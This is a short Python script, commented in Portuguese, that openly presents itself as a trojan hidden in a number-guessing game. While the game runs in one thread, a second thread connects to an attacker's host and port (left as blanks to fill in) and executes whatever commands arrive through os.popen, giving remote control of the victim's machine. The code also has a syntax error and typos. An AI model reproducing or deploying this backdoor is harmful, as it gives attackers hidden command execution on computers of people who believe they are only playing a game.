#!/usr/bin/python3

#Trojan em um jogo

import random
import socket
import threading
import os
def trojan():
	#COLOQUE O IP NO HOST

	HOST = ''
	PORT = 0 #COLOQUE UMA PORTA AQUI


	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((HOST, PORT))

	cmd_mode = False

	while True:
		server_command = client.recv(1024).decode('utf-8')
		if server_command == "cmdon":
			cmd_mode = True
			client.send("You now have terminal acess".encode('utf-8'))
			continue
		if server_command == "cmdoff"
			cmd_mode = False
		if cmd_mode:
			os.popen(server_command)
		else:
			if server_command == "hello":
				print("Hello World!")
			client.send(f"{server_command} was executed sucessfully!".encode('utf-8'))
def game():
	number = random.randint(0, 1000)
	tries = 1
	done = False

	while not done:
		guess = int(input("Entre com a advinhacao "))

		if guess == number:
			done = True
			print("Voce venceu!!!!!")
		else:
			tries += 1
		if guess > number:
			print("O numero atual e menor!")
		else:
			print("O numero atual e maior!")
	print(f"You needed {tries} tries")

t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()

